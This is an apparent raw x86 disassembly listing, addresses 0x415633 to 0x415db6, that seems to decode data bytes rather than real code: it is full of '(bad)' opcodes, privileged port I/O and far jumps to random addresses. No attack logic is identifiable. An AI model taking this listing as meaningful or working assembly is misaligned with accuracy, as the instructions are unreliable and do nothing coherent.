  415633:	cmp    ebp,ebx
  415635:	dec    ecx
  415637:	jge    0x4155ee
  415639:	jl     0x415676
  41563b:	mov    edi,0xcde171c6
  415640:	inc    ebx
  415641:	fdiv   DWORD PTR [ebx]
  415643:	cmp    eax,0x180822cc
  415648:	outs   dx,DWORD PTR ds:[esi]
  415649:	jge    0x4156c2
  41564b:	jl     0x41567d
  41564d:	xor    DWORD PTR [edx+edi*2+0x51c68a36],ebp
  415654:	add    ch,BYTE PTR [ebx]
  415656:	and    BYTE PTR [bp+si+0x5b39],0x2c
  41565c:	in     eax,dx
  41565d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565e:	xchg   ebx,eax
  41565f:	adc    al,BYTE PTR [edx-0x32]
  415662:	pushf  
  415663:	inc    ecx
  415664:	aad    0x17
  415666:	outs   dx,DWORD PTR ds:[esi]
  415667:	mov    WORD PTR [eax],?
  415669:	ficom  DWORD PTR [esi-0xe3cd4b6]
  41566f:	je     0x4156b1
  415671:	fcom   QWORD PTR [edx]
  415673:	not    DWORD PTR [edi+0x32]
  415676:	jo     0x4156d7
  415678:	push   ss
  415679:	inc    eax
  41567a:	inc    edi
  41567b:	ror    dl,1
  41567d:	hlt    
  41567e:	cmp    eax,DWORD PTR [edx+0x6663e668]
  415684:	test   al,0x3c
  415686:	xor    BYTE PTR [esi],dh
  415688:	pop    ebx
  415689:	test   eax,0xe7c517a0
  41568e:	lds    esi,FWORD PTR [esi+0x2f8a3ebd]
  415694:	stc    
  415695:	adc    esp,0xffffffe5
  415698:	mov    eax,fs
  41569a:	fist   WORD PTR [ecx+0x6e3638e]
  4156a0:	sub    eax,0x169d57b6
  4156a5:	bound  esi,QWORD PTR [eax+eiz*2]
  4156a8:	xchg   ecx,eax
  4156a9:	xor    al,0x8f
  4156ab:	std    
  4156ac:	push   0xffffffde
  4156ae:	sbb    BYTE PTR [ebx-0xe],ch
  4156b1:	fadd   st,st(6)
  4156b3:	ss loope 0x415682
  4156b6:	ds mov al,0x9a
  4156b9:	mov    eax,0xddcbf0e4
  4156be:	jo     0x41567e
  4156c0:	pop    es
  4156c1:	dec    esi
  4156c2:	fisub  DWORD PTR [edx+0x17]
  4156c5:	jge    0x415666
  4156c7:	loopne 0x415735
  4156c9:	test   DWORD PTR [edi+ecx*4-0x28],edx
  4156cd:	loopne 0x41570a
  4156cf:	fldenv [ebx+ecx*8]
  4156d2:	ret    0x85
  4156d5:	jno    0x4156e2
  4156d7:	mov    al,ds:0xc87e9ca1
  4156dc:	add    eax,0xc094904f
  4156e1:	push   0x8931126b
  4156e6:	inc    esp
  4156e7:	cmp    al,0x92
  4156e9:	mov    bh,0xe7
  4156eb:	fwait
  4156ec:	xor    edi,DWORD PTR [edx-0x292919b2]
  4156f2:	jp     0x415746
  4156f4:	sub    eax,ecx
  4156f6:	mov    edx,0x5e42b6bf
  4156fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156fc:	inc    ebx
  4156fd:	lea    ebp,[ebx+0x25a9ecba]
  415703:	fs popa 
  415705:	mov    BYTE PTR [eax],ch
  415707:	or     ebp,DWORD PTR [edx]
  415709:	rcl    BYTE PTR [ebx+0x1aa56b50],0xd2
  415710:	pop    ecx
  415711:	mov    esi,0x1936af23
  415716:	pop    esi
  415717:	and    DWORD PTR [ecx+eiz*4-0x54],0xe0a3c3f9
  41571f:	aam    0x51
  415721:	or     BYTE PTR [ebx],bh
  415723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415724:	test   DWORD PTR [edx-0x22cfd10e],ecx
  41572a:	sub    DWORD PTR [eax-0xe],0x2f
  41572e:	fldcw  WORD PTR [edi-0x72e0a4a3]
  415734:	in     al,0x65
  415736:	inc    edi
  415737:	xchg   edi,eax
  415738:	stos   DWORD PTR es:[edi],eax
  415739:	shr    DWORD PTR [eax-0x1d55cfde],cl
  41573f:	(bad)  
  415740:	push   edx
  415741:	adc    DWORD PTR [ebx+esi*2],0xffffffdd
  415745:	xor    al,BYTE PTR [eax]
  415747:	int    0xc0
  415749:	in     al,0xd9
  41574b:	push   es
  41574c:	mov    ds:0x30f4f87f,al
  415751:	mov    cs,WORD PTR [edi-0x48]
  415754:	sub    dh,bl
  415756:	jns    0x415700
  415758:	jecxz  0x415744
  41575a:	cmp    eax,0xa305a20a
  41575f:	xchg   ebp,eax
  415760:	in     al,dx
  415761:	xchg   ecx,eax
  415762:	mov    cl,0x1b
  415764:	test   al,0xd
  415766:	mov    WORD PTR [eax+0x69adeb8],gs
  41576c:	imul   esp,DWORD PTR [esi+0x3],0xffffffb6
  415770:	daa    
  415771:	xchg   ebp,eax
  415772:	fstp   DWORD PTR [esi+0x6f]
  415775:	push   ebx
  415776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415777:	push   ss
  415778:	fmul   DWORD PTR [ecx]
  41577a:	and    DWORD PTR [ebp+0x76],0x76
  41577e:	sbb    dl,BYTE PTR [eax*8-0x36d44a91]
  415785:	out    dx,al
  415786:	addps  xmm1,XMMWORD PTR ds:0xce377452
  41578d:	jnp    0x4157fb
  41578f:	jbe    0x41572e
  415791:	xchg   esi,eax
  415792:	add    DWORD PTR ds:0x3f3d037b,edi
  415798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415799:	push   ebx
  41579a:	pop    ebx
  41579b:	out    dx,al
  41579c:	pop    edx
  41579d:	ss mov eax,0x9f8ee944
  4157a3:	adc    eax,0x8ee590d2
  4157a8:	mov    ecx,0xd1d87033
  4157ad:	cmp    al,ah
  4157af:	les    edx,FWORD PTR [edi-0x3f]
  4157b2:	dec    eax
  4157b3:	xlat   BYTE PTR ds:[ebx]
  4157b4:	cmp    eax,0x2f3b5628
  4157b9:	and    ebx,esi
  4157bb:	jp     0x415817
  4157bd:	addr16 into 
  4157bf:	jo     0x415834
  4157c1:	dec    esp
  4157c2:	xchg   esi,eax
  4157c3:	jmp    0x6953b9a7
  4157c8:	dec    esp
  4157c9:	xchg   esi,eax
  4157ca:	(bad)  
  4157cd:	pop    edi
  4157ce:	lods   al,BYTE PTR ds:[esi]
  4157cf:	sbb    eax,0xa5c2907f
  4157d4:	call   0xc6e9:0xe7f9ce24
  4157db:	in     al,0x89
  4157dd:	(bad)  
  4157de:	jmp    0x87c3d83b
  4157e3:	mov    eax,fs:0x9f1d4ca7
  4157e9:	jno    0x41584f
  4157eb:	call   0xedde:0xeda4c802
  4157f2:	jmp    0x4de10a8d
  4157f7:	repz data16 daa 
  4157fa:	arpl   dx,cx
  4157fc:	mov    DWORD PTR [ecx+0xe849c1d],esi
  415802:	ja     0x41584c
  415804:	ret    
  415805:	inc    edi
  415806:	pop    ecx
  415807:	xor    eax,0xd6807f6d
  41580c:	rcr    dl,cl
  41580e:	adc    BYTE PTR [edi],bh
  415810:	push   0x60c65dca
  415815:	cmp    BYTE PTR [edx],ch
  415817:	add    ebx,DWORD PTR [esi-0x6a]
  41581a:	add    al,BYTE PTR [edi-0x52]
  41581d:	xchg   esp,eax
  41581e:	imul   ebp,ecx,0xabfb033d
  415824:	dec    ecx
  415825:	scas   eax,DWORD PTR es:[edi]
  415826:	inc    esp
  415827:	sbb    ch,ah
  415829:	cld    
  41582a:	popf   
  41582b:	push   cs
  41582c:	int    0xf
  41582e:	mov    ah,0x53
  415830:	sbb    esi,DWORD PTR [ecx-0x390cffb8]
  415836:	pop    edx
  415837:	popa   
  415838:	in     eax,0x93
  41583a:	pop    ecx
  41583b:	fstp   st(3)
  41583d:	clc    
  41583e:	push   ss
  41583f:	jb     0x41584a
  415841:	jno    0x4157f2
  415843:	daa    
  415844:	jmp    0x6744:0x2b8e471
  41584b:	xchg   ebx,eax
  41584c:	(bad)  
  41584d:	ss pop esp
  41584f:	icebp  
  415850:	dec    esp
  415851:	jns    0x4158ae
  415853:	adc    al,0x5b
  415855:	dec    edx
  415856:	mov    bh,ah
  415858:	ret    
  415859:	inc    ebx
  41585a:	mov    ah,0xe7
  41585c:	and    al,cl
  41585e:	jle    0x415830
  415860:	fimul  WORD PTR es:[edx]
  415863:	inc    edi
  415864:	(bad)  
  415865:	cld    
  415866:	popa   
  415867:	push   ss
  415868:	push   es
  415869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41586a:	inc    ebx
  41586b:	xchg   ecx,eax
  41586c:	test   edi,esi
  41586e:	out    dx,al
  41586f:	gs lahf 
  415871:	cmp    BYTE PTR [ebx],dl
  415873:	inc    ebp
  415874:	push   ecx
  415875:	mov    cl,0x34
  415877:	ds (bad) 
  415879:	lods   eax,DWORD PTR ds:[esi]
  41587a:	cdq    
  41587b:	loop   0x4158d6
  41587d:	push   ebp
  41587e:	test   eax,0x7e9b1dd8
  415883:	(bad)  
  415884:	push   0xffffff82
  415886:	inc    eax
  415887:	cmc    
  415888:	int3   
  415889:	outs   dx,BYTE PTR ds:[esi]
  41588a:	loope  0x4158df
  41588c:	movnti DWORD PTR [esi-0xd],eax
  415890:	add    eax,0x85b2b7d2
  415895:	in     eax,dx
  415896:	rol    BYTE PTR ds:0x8608c8f1,cl
  41589c:	test   al,0xd1
  41589e:	push   edi
  41589f:	jecxz  0x415837
  4158a1:	into   
  4158a2:	mov    dh,0x3c
  4158a4:	int3   
  4158a5:	inc    eax
  4158a6:	push   ebx
  4158a7:	dec    ebp
  4158a8:	sub    esp,DWORD PTR ds:0x4edb8d6c
  4158ae:	jae    0x4158b3
  4158b0:	data16 mov al,ds:0x430e7273
  4158b6:	dec    ebx
  4158b7:	outs   dx,DWORD PTR ds:[esi]
  4158b8:	(bad)  
  4158b9:	or     al,0x49
  4158bb:	cdq    
  4158bc:	pop    ebx
  4158bd:	in     al,dx
  4158be:	in     al,0x8
  4158c0:	fisttp WORD PTR [ebx-0x12]
  4158c3:	shl    DWORD PTR [eax+eax*2-0x12],1
  4158c7:	(bad)  
  4158c8:	sub    al,0xf7
  4158ca:	jne    0x415867
  4158cc:	mov    cl,0x9
  4158ce:	pop    ss
  4158cf:	pop    ss
  4158d0:	push   ss
  4158d1:	shl    DWORD PTR [ecx],0x3d
  4158d4:	rcr    BYTE PTR [edi],cl
  4158d6:	dec    esi
  4158d7:	xchg   esp,eax
  4158d8:	imul   edi,DWORD PTR [eax+0x693fe847],0x2
  4158df:	shl    BYTE PTR [ecx-0x38816efc],cl
  4158e5:	or     al,0x53
  4158e7:	mov    bl,0xd4
  4158e9:	mov    esp,DWORD PTR [ebx-0x68e5f8a9]
  4158ef:	popf   
  4158f0:	sahf   
  4158f1:	add    DWORD PTR [ebx-0x180c83cb],eax
  4158f7:	retf   0xd5ce
  4158fa:	cmp    al,0x29
  4158fc:	or     al,0x28
  4158fe:	dec    ecx
  4158ff:	push   0xffffffab
  415901:	fadd   DWORD PTR [esp+ecx*2]
  415904:	es jle 0x415894
  415907:	inc    ebp
  415908:	mov    ds:0x66fdd64e,al
  41590d:	jle    0x415987
  41590f:	push   es
  415910:	xchg   cx,ax
  415912:	dec    ebx
  415913:	and    DWORD PTR [edi-0x53],eax
  415916:	cmp    ecx,DWORD PTR ds:0x9d93bf5e
  41591c:	xor    ebx,ebp
  41591e:	jl     0x4158b5
  415920:	mov    dl,0x39
  415922:	les    ecx,FWORD PTR [esi+0x41]
  415925:	cmp    dh,cl
  415927:	test   DWORD PTR [eax-0xb],eax
  41592a:	jmp    0xd8b2:0x6267b116
  415931:	sub    ch,bh
  415933:	xchg   ecx,eax
  415934:	lea    ecx,[esi-0x2fe18f6]
  41593a:	xchg   edx,eax
  41593b:	das    
  41593c:	into   
  41593d:	dec    ecx
  41593e:	call   0x4a3b9691
  415943:	adc    al,0x6d
  415945:	mov    ebp,0xd67f9f70
  41594a:	dec    edi
  41594b:	or     dh,bl
  41594d:	xchg   ebp,eax
  41594e:	repnz xor al,0xf
  415951:	dec    edi
  415952:	pop    es
  415953:	mov    al,0x89
  415955:	or     BYTE PTR [esi+0x3cd4f775],ch
  41595b:	das    
  41595c:	ror    bh,1
  41595e:	scas   al,BYTE PTR es:[edi]
  41595f:	push   ebp
  415960:	jmp    0x278fd55f
  415965:	or     BYTE PTR [ebp-0x266beabb],bh
  41596b:	xor    edx,ebp
  41596d:	pop    esi
  41596e:	shl    edx,cl
  415970:	push   ds
  415971:	aaa    
  415972:	addr16 mov ebp,0x7010f3e
  415978:	push   ds
  415979:	aam    0x1e
  41597b:	mov    ecx,0x566e24a2
  415980:	jmp    0xbd7d:0x6429b060
  415987:	retf   0x59f3
  41598a:	pop    es
  41598b:	or     cl,dh
  41598d:	or     al,0x9d
  41598f:	outs   dx,DWORD PTR ds:[esi]
  415990:	or     al,0xfc
  415992:	test   al,0x95
  415994:	mov    eax,ds:0xfca142b8
  415999:	stc    
  41599a:	aad    0x81
  41599c:	inc    ecx
  41599d:	test   DWORD PTR [ecx-0x18],ebp
  4159a0:	(bad)  
  4159a1:	xor    eax,0x6b1f7630
  4159a6:	mov    dh,cl
  4159a8:	sub    eax,0x98a9b84e
  4159ad:	pop    eax
  4159ae:	jns    0x41593b
  4159b0:	xlat   BYTE PTR ds:[ebx]
  4159b1:	mov    dh,0x67
  4159b3:	push   ds
  4159b4:	out    dx,al
  4159b5:	pop    esp
  4159b6:	gs sub dl,ch
  4159b9:	pop    ebp
  4159ba:	lods   eax,DWORD PTR ds:[esi]
  4159bb:	retf   
  4159bc:	pop    esp
  4159bd:	pop    esp
  4159be:	sub    DWORD PTR [eax],esp
  4159c0:	cmp    BYTE PTR [esi-0x1b],0x7d
  4159c4:	(bad)  
  4159c5:	fcmovne st,st(4)
  4159c7:	sahf   
  4159c8:	cmp    eax,0x901fc076
  4159cd:	sbb    BYTE PTR [ecx+edx*2],ah
  4159d0:	push   eax
  4159d1:	xor    BYTE PTR [edi+ebx*4],ch
  4159d4:	hlt    
  4159d5:	out    0x4e,al
  4159d7:	cmp    eax,0xb9f60da9
  4159dc:	stc    
  4159dd:	out    dx,al
  4159de:	add    bh,BYTE PTR [edi+0x6715cfff]
  4159e4:	jmp    DWORD PTR [edi]
  4159e6:	test   DWORD PTR [edi+0x5b4c8481],0xb247ed93
  4159f0:	call   0xffc2c06b
  4159f5:	push   edx
  4159f6:	data16 daa 
  4159f8:	and    al,0xc
  4159fa:	dec    esp
  4159fb:	sbb    esp,DWORD PTR [eax+esi*1+0x7f]
  4159ff:	mov    eax,ds:0xe8e65d7
  415a04:	xor    al,0x4f
  415a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a07:	adc    BYTE PTR [ecx+0x6b9af326],ch
  415a0d:	or     dl,bl
  415a0f:	icebp  
  415a10:	test   al,0x0
  415a12:	sar    DWORD PTR [edx-0x59d42fb9],1
  415a18:	pop    edx
  415a19:	pop    eax
  415a1a:	cmp    al,0x60
  415a1c:	daa    
  415a1d:	adc    DWORD PTR [eax],ecx
  415a1f:	jecxz  0x415a3a
  415a21:	add    BYTE PTR [edx],dl
  415a23:	mov    bh,0x86
  415a25:	pop    edi
  415a26:	lahf   
  415a27:	jae    0x415a77
  415a29:	adc    DWORD PTR [ebp+0x55],edx
  415a2c:	rol    edx,1
  415a2e:	push   edx
  415a2f:	mov    eax,0x47b6bf3f
  415a34:	lock cmp ecx,DWORD PTR [edx+0x7f153d0c]
  415a3b:	push   ds
  415a3c:	jmp    0x415abd
  415a3e:	mov    ds:0x2f19d673,al
  415a43:	sti    
  415a44:	push   es
  415a45:	js     0x415a13
  415a47:	mov    al,ds:0x8392d544
  415a4c:	in     al,dx
  415a4d:	adc    al,0xd9
  415a4f:	scas   eax,DWORD PTR es:[edi]
  415a50:	dec    ebx
  415a51:	pop    edx
  415a52:	call   0x830a0d35
  415a57:	les    esp,FWORD PTR [esi+0x56053d73]
  415a5d:	pop    edi
  415a5e:	lock add ch,BYTE PTR [eax+0x7d32ef1a]
  415a65:	sub    eax,DWORD PTR [eax]
  415a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a68:	mov    esi,0x93d52fc2
  415a6d:	sbb    eax,0xe9c65048
  415a72:	jmp    0x415aee
  415a74:	into   
  415a75:	xor    cl,BYTE PTR [esi]
  415a77:	xchg   esi,eax
  415a78:	sub    edx,ebp
  415a7a:	jp     0x415ad5
  415a7c:	mov    ah,0xad
  415a7e:	mov    esp,ebx
  415a80:	dec    ebx
  415a81:	outs   dx,BYTE PTR ds:[esi]
  415a82:	outs   dx,BYTE PTR ds:[esi]
  415a83:	pop    es
  415a84:	xchg   esi,eax
  415a85:	and    ebp,edx
  415a87:	pop    edx
  415a88:	sub    ebp,DWORD PTR [ecx-0x40]
  415a8b:	jl     0x415a31
  415a8d:	jno    0x415ad3
  415a8f:	mov    DWORD PTR [edi],eax
  415a91:	adc    al,0x7c
  415a93:	outs   dx,DWORD PTR ds:[esi]
  415a94:	xlat   BYTE PTR ds:[ebx]
  415a95:	clc    
  415a96:	jno    0x415aa2
  415a98:	xchg   edi,eax
  415a99:	mov    bl,0x24
  415a9b:	bound  esi,QWORD PTR [edi]
  415a9d:	inc    edx
  415a9e:	(bad)  
  415a9f:	ja     0x415b1e
  415aa1:	add    al,0x6a
  415aa3:	sub    ch,BYTE PTR [ebp+ebx*1+0x27]
  415aa7:	imul   edi,DWORD PTR [edi],0xa6edde6b
  415aad:	mov    edx,0xdb7a642a
  415ab2:	cmp    DWORD PTR [edx],ebx
  415ab4:	push   ecx
  415ab5:	or     eax,0xe46bb19e
  415aba:	mov    ah,dh
  415abc:	sub    edx,DWORD PTR [eax+0x44]
  415abf:	inc    esi
  415ac0:	(bad)  
  415ac1:	push   esp
  415ac2:	xor    DWORD PTR [ebx],ebp
  415ac4:	sbb    BYTE PTR [esp+eax*8-0x2a],cl
  415ac8:	ds std 
  415aca:	xchg   edx,eax
  415acb:	sub    eax,0x6d5d2ada
  415ad0:	pushf  
  415ad1:	test   eax,0xe57860f6
  415ad6:	push   ds
  415ad7:	mov    al,0x38
  415ad9:	cmc    
  415ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415adb:	loop   0x415a76
  415add:	pop    es
  415ade:	rep repnz lods al,BYTE PTR ds:[esi]
  415ae1:	test   BYTE PTR [eax],bh
  415ae3:	or     DWORD PTR [ebx+ecx*8-0x30],esp
  415ae7:	fwait
  415ae8:	mov    BYTE PTR [eax-0x6a],bh
  415aeb:	mov    bl,0x54
  415aed:	xor    al,0xb5
  415aef:	out    dx,eax
  415af0:	sbb    cl,BYTE PTR [ebp+0x7910a6f1]
  415af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af7:	or     BYTE PTR [esi+0x23ce25bc],dh
  415afd:	push   0x65
  415aff:	xchg   ebp,eax
  415b00:	popf   
  415b01:	mov    al,0x3d
  415b03:	and    DWORD PTR [edx],0x56e9b50f
  415b09:	adc    BYTE PTR [ecx],bl
  415b0b:	jbe    0x415b20
  415b0d:	fwait
  415b0e:	(bad)
  415b11:	pop    esp
  415b12:	aam    0xab
  415b14:	cmp    DWORD PTR [esi+0x1384c58f],0x5e
  415b1b:	cmp    DWORD PTR [ebx+0x76],ebp
  415b1e:	cwde   
  415b1f:	inc    esp
  415b20:	and    al,0x7c
  415b22:	sbb    al,0xe1
  415b24:	not    BYTE PTR [edi]
  415b26:	mov    bh,0x93
  415b28:	adc    bl,BYTE PTR [esi]
  415b2a:	add    eax,0xaa0d2365
  415b2f:	pop    es
  415b30:	(bad)  
  415b31:	push   eax
  415b32:	sub    eax,0xb96af018
  415b37:	ins    BYTE PTR es:[edi],dx
  415b38:	sub    ebx,DWORD PTR [eax]
  415b3a:	in     al,dx
  415b3b:	in     al,0xb5
  415b3d:	out    0x62,eax
  415b3f:	xchg   esp,eax
  415b40:	aaa    
  415b41:	mov    esi,DWORD PTR [edx+0x61]
  415b44:	nop
  415b45:	sub    ecx,ebp
  415b47:	popf   
  415b48:	pop    esp
  415b49:	loope  0x415b1c
  415b4b:	retf   
  415b4c:	lock mov ds:0xbdece77,al
  415b52:	aas    
  415b53:	(bad)  
  415b54:	pop    ebx
  415b55:	push   es
  415b56:	adc    BYTE PTR [edi],bl
  415b58:	mov    ds:0xbc504236,al
  415b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b5e:	jl     0x415bc6
  415b60:	dec    ebx
  415b61:	push   cs
  415b62:	enter  0x705b,0x69
  415b66:	xor    al,0x2b
  415b68:	inc    ebx
  415b69:	test   al,0x69
  415b6b:	sbb    DWORD PTR [eax+0x26e2b52a],edi
  415b71:	dec    eax
  415b72:	dec    esi
  415b73:	les    ebp,FWORD PTR [ebp+0x64]
  415b76:	adc    DWORD PTR [ecx-0x5f86085e],0x22
  415b7d:	xchg   esi,eax
  415b7e:	mov    dh,0x94
  415b80:	xor    cl,BYTE PTR [ebx]
  415b82:	mov    BYTE PTR [ecx+0x28],ch
  415b85:	stos   BYTE PTR es:[edi],al
  415b86:	fsubr  QWORD PTR [eax]
  415b88:	(bad)  
  415b89:	lock dec ecx
  415b8b:	ja     0x415ba7
  415b8d:	stc    
  415b8e:	or     al,0xba
  415b90:	xchg   ebx,eax
  415b91:	adc    ebx,esi
  415b93:	aad    0x20
  415b95:	mov    DWORD PTR [edi-0x1eeb4bbe],edi
  415b9b:	sbb    dh,BYTE PTR [esi-0x54ba4e2d]
  415ba1:	(bad)  
  415ba2:	mov    ecx,0x47ca6af7
  415ba7:	pop    edx
  415ba8:	jmp    0xa399fabe
  415bad:	outs   dx,DWORD PTR ds:[esi]
  415bae:	cmp    eax,0xa282405d
  415bb3:	sbb    BYTE PTR [eax],ch
  415bb5:	out    0x8e,al
  415bb7:	call   0x54a6:0x9e622725
  415bbe:	add    cl,BYTE PTR [bp+di-0x45]
  415bc2:	(bad)  [ecx+0x1d20f412]
  415bc8:	mov    ds:0x8df42d3a,eax
  415bcd:	push   ds
  415bce:	fisttp WORD PTR [esi-0x48]
  415bd1:	add    bh,BYTE PTR [esi+0x34]
  415bd4:	leave  
  415bd5:	int3   
  415bd6:	test   dh,al
  415bd8:	jb     0x415c4d
  415bda:	popa   
  415bdb:	mov    ds:0x51b28f14,eax
  415be0:	mov    edx,0x1dd11351
  415be5:	imul   ebp,DWORD PTR [ebx-0x6975edef],0x73cf4d2
  415bef:	mov    ch,0xb3
  415bf1:	adc    edi,eax
  415bf3:	jle    0x415c2b
  415bf5:	xor    WORD PTR [esi+0x4ec64d61],bx
  415bfc:	lods   eax,DWORD PTR ds:[esi]
  415bfd:	cmp    esi,0x6ed52381
  415c03:	adc    ah,BYTE PTR [edi-0x7e]
  415c06:	mov    edx,0xc470c265
  415c0b:	or     DWORD PTR es:[edx+ebp*8-0x37],edx
  415c10:	aad    0xb
  415c12:	sub    bl,BYTE PTR [eax-0x218fe4fe]
  415c18:	inc    edi
  415c19:	std    
  415c1a:	fcomp  DWORD PTR [ebp+0x44]
  415c1d:	cmp    bl,cl
  415c1f:	fdiv   st,st(0)
  415c21:	push   ecx
  415c22:	mov    eax,0xddda2892
  415c27:	bound  ebx,QWORD PTR [edx+0x578e82bf]
  415c2d:	lods   eax,DWORD PTR ds:[esi]
  415c2e:	(bad)  [esi-0x23576ccd]
  415c34:	fs (bad) 
  415c36:	in     eax,dx
  415c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c38:	sbb    al,0xbd
  415c3a:	imul   edi,DWORD PTR [ecx+0x37eaf9d6],0xae5c79b9
  415c44:	jmp    DWORD PTR [ebx]
  415c46:	add    dl,BYTE PTR [esi+edi*8+0x54]
  415c4a:	adc    al,0xaa
  415c4c:	outs   dx,DWORD PTR ds:[esi]
  415c4d:	mov    DWORD PTR ds:0xfd38eba7,0xe4a447a1
  415c57:	into   
  415c58:	in     al,dx
  415c59:	push   cs
  415c5a:	adc    eax,0xd8756a58
  415c5f:	mov    ah,0xa4
  415c61:	cmp    bh,al
  415c63:	mov    edi,0x300f5930
  415c68:	shr    DWORD PTR [ebx+ebx*4],1
  415c6b:	mov    DWORD PTR [eax],edi
  415c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c6e:	cmp    al,ah
  415c70:	in     al,dx
  415c71:	ret    
  415c72:	xchg   esp,eax
  415c73:	pop    esi
  415c74:	cmp    BYTE PTR [ebx-0x37cff9ef],al
  415c7a:	xor    dl,al
  415c7c:	mov    ds:0x638eb429,eax
  415c81:	mov    esi,0x684028f3
  415c86:	cdq    
  415c87:	repnz shl ah,0xdf
  415c8b:	jp     0x415d05
  415c8d:	xlat   BYTE PTR ds:[ebx]
  415c8e:	push   ebx
  415c8f:	dec    edx
  415c90:	je     0x415c9b
  415c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c93:	add    ebx,edi
  415c95:	mov    eax,ds:0x241fb5e2
  415c9a:	sbb    bh,ch
  415c9c:	cwde   
  415c9d:	fadd   QWORD PTR [ecx-0x4d]
  415ca0:	push   0x3feee42b
  415ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca6:	dec    ebp
  415ca7:	imul   ecx,esp,0x4264ff5d
  415cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cae:	nop
  415caf:	dec    ebx
  415cb0:	jge    0x415d25
  415cb2:	int3   
  415cb3:	cld    
  415cb4:	es cmp eax,0xd13ab763
  415cba:	add    DWORD PTR [eax+0x22],ebp
  415cbd:	inc    edx
  415cbe:	mov    al,ds:0x607aaf68
  415cc3:	test   BYTE PTR [esi],ah
  415cc5:	loop   0x415c9b
  415cc7:	sub    DWORD PTR [edi+0xf1c9240],esi
  415ccd:	pop    DWORD PTR [esi-0xa]
  415cd0:	lahf   
  415cd1:	pop    ebx
  415cd2:	xor    al,0xbc
  415cd4:	pop    ds
  415cd5:	mov    ah,0x7f
  415cd7:	mov    ch,0x7f
  415cd9:	pop    edi
  415cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cdb:	sbb    DWORD PTR [ecx+0x63],esi
  415cde:	retf   0x3f98
  415ce1:	xchg   esi,eax
  415ce2:	push   ss
  415ce3:	shl    esp,1
  415ce5:	stos   BYTE PTR es:[edi],al
  415ce6:	add    al,0xf4
  415ce8:	std    
  415ce9:	cwde   
  415cea:	jmp    0x415ce3
  415cec:	in     al,dx
  415ced:	mov    ?,WORD PTR [ecx+0x52c0376]
  415cf3:	inc    esi
  415cf4:	ret    0x5921
  415cf7:	ret    0x3a8d
  415cfa:	and    eax,DWORD PTR [edi]
  415cfc:	(bad)  
  415cfd:	addr16 mov dh,0xc6
  415d00:	pushf  
  415d01:	xor    DWORD PTR [esi-0x59],edi
  415d04:	test   DWORD PTR [ebp+eax*2+0x38a1960],esi
  415d0b:	fild   QWORD PTR ds:0x91a2db43
  415d11:	hlt    
  415d12:	repnz xchg ebx,eax
  415d14:	jns    0x415cd5
  415d16:	jle    0x415d89
  415d18:	cdq    
  415d19:	stc    
  415d1a:	xor    al,BYTE PTR [ebp+0x5]
  415d1d:	inc    esi
  415d1e:	pop    ebp
  415d1f:	mov    eax,ds:0x717c460a
  415d24:	es aam 0x85
  415d27:	hlt    
  415d28:	or     BYTE PTR [esi],bh
  415d2a:	pop    eax
  415d2b:	in     eax,dx
  415d2c:	dec    eax
  415d2d:	and    al,0xa1
  415d2f:	and    bl,dl
  415d31:	pop    edx
  415d32:	in     eax,0x94
  415d34:	lock popa 
  415d36:	bound  edx,QWORD PTR [ebp+0x73]
  415d39:	hlt    
  415d3a:	fnstcw WORD PTR [edx+0x63]
  415d3d:	dec    esi
  415d3e:	pop    ss
  415d3f:	das    
  415d40:	push   edi
  415d41:	and    al,0x79
  415d43:	stos   DWORD PTR es:[edi],eax
  415d44:	push   0x952a3fb
  415d49:	scas   al,BYTE PTR es:[edi]
  415d4a:	popa   
  415d4b:	adc    ch,BYTE PTR [ebp-0x153bdf0a]
  415d51:	push   edi
  415d52:	stos   DWORD PTR es:[edi],eax
  415d53:	mov    al,ds:0xe54376e8
  415d58:	mov    bh,0xce
  415d5a:	mov    bh,al
  415d5c:	mov    WORD PTR [edx+0x38],ds
  415d5f:	scas   al,BYTE PTR es:[edi]
  415d60:	ins    DWORD PTR es:[edi],dx
  415d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d62:	push   ds
  415d63:	dec    edx
  415d64:	xchg   esp,eax
  415d65:	pop    ebp
  415d66:	pop    edx
  415d67:	sbb    ebx,edi
  415d69:	inc    edx
  415d6a:	iret   
  415d6b:	(bad)  [edi+0x2]
  415d6e:	stos   DWORD PTR es:[edi],eax
  415d6f:	inc    esi
  415d70:	mov    ebp,0x83d982c1
  415d75:	addr16 loopne 0x415cfc
  415d78:	or     BYTE PTR [edi-0x359a6b8b],0xd5
  415d7f:	xchg   edi,eax
  415d80:	inc    eax
  415d81:	add    eax,DWORD PTR [edi]
  415d83:	cdq    
  415d84:	shl    BYTE PTR fs:[esi],cl
  415d87:	pop    ebx
  415d88:	mov    ebx,0x84df9321
  415d8d:	imul   eax,esp
  415d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d91:	fcmovnbe st,st(4)
  415d93:	(bad)  
  415d94:	out    dx,eax
  415d95:	ror    bl,1
  415d97:	lea    edx,[ecx]
  415d99:	mov    esi,0xf9fd08b1
  415d9e:	gs fs iret 
  415da1:	push   es
  415da2:	jp     0x415e02
  415da4:	hlt    
  415da5:	inc    DWORD PTR [edi+0x10]
  415da8:	clc    
  415da9:	and    DWORD PTR [edi-0x17],ebp
  415dac:	out    0xa3,eax
  415dae:	ins    BYTE PTR es:[edi],dx
  415daf:	dec    ebx
  415db0:	test   BYTE PTR [ebx+0xb],dh
  415db3:	add    BYTE PTR [edi+0x73],al
  415db6:	(bad)  
